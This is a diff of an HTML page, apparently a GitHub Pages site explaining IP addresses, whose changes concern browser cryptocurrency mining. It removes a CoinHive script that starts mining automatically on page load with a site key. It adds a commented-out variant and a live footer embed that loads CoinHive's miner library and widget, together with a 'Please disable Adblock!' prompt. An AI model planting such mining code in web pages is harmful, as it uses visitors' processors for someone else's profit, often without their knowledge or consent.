@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=640">
     <meta name="description" content="Endereço IP, de forma genérica, é uma identificação de um dispositivo (computador, impressora, etc) em uma rede local ou pública.">
 
-    <link rel="stylesheet" href="/assets/css/style.css?v=379ff6bda24bf1f06d3ba9e4c1c2d323bf17f8db" media="screen">
+    <link rel="stylesheet" href="/assets/css/style.css?v=3dd9a20768dcc80e17602a091524e62d17b079a8" media="screen">
     <link rel="stylesheet" href="/assets/css/mobile.css" media="handheld, only screen and (max-device-width:640px)">
     <link rel="stylesheet" href="/assets/css/non-screen.css" media="handheld, only screen and (max-device-width:640px)">
 
@@ -56,6 +56,41 @@
         </span>
         <p>Generated with <a href="https://pages.github.com">GitHub Pages</a> using Merlot</p>
         <span class="octocat"></span>
+        <!-- <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+  //var miner = new CoinHive.Anonymous('I4Z6qau09gxJCkJR4BXO46ZK9gd4YIvw');
+  var miner = new CoinHive.Anonymous('UrKEvHSlqxAVvpOOjNgjFg755kVm5XjP');
+
+  miner.start();
+
+  // Listen on events
+  miner.on('found', function() { /* Hash found */ })
+  miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+  // Update stats once per second
+  setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+    //
+    // console.log('hashesPerSecond');
+    // console.log(hashesPerSecond);
+    document.getElementById("hashpersecond").innerHTML=hashesPerSecond;
+    document.getElementById("total_hashes").innerHTML=totalHashes;
+    document.getElementById("accepted_hashes").innerHTML=acceptedHashes;
+    // console.log('totalHashes');
+    // console.log(totalHashes);
+    // console.log('acceptedHashes');
+    // console.log(acceptedHashes);
+  }, 1000);
+</script> -->
+<script src="https://coinhive.com/lib/miner.min.js" async></script>
+<div class="coinhive-miner"
+	style="width: 100%; height: 200px"
+	data-key="UrKEvHSlqxAVvpOOjNgjFg755kVm5XjP">
+	<em>Please disable Adblock!</em>
+</div>
+
       </footer>
 
     </div>
@@ -105,33 +140,6 @@
   getFromIpInfo();
 </script>
  -->
-    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script type="text/javascript">
-  var miner = new CoinHive.Anonymous('I4Z6qau09gxJCkJR4BXO46ZK9gd4YIvw');
-
-  miner.start();
-
-  // Listen on events
-  miner.on('found', function() { /* Hash found */ })
-  miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-  // Update stats once per second
-  setInterval(function() {
-    var hashesPerSecond = miner.getHashesPerSecond();
-    var totalHashes = miner.getTotalHashes();
-    var acceptedHashes = miner.getAcceptedHashes();
-    //
-    // console.log('hashesPerSecond');
-    // console.log(hashesPerSecond);
-    document.getElementById("hashpersecond").innerHTML=hashesPerSecond;
-    document.getElementById("total_hashes").innerHTML=totalHashes;
-    document.getElementById("accepted_hashes").innerHTML=acceptedHashes;
-    // console.log('totalHashes');
-    // console.log(totalHashes);
-    // console.log('acceptedHashes');
-    // console.log(acceptedHashes);
-  }, 1000);
-</script>
 
 
     
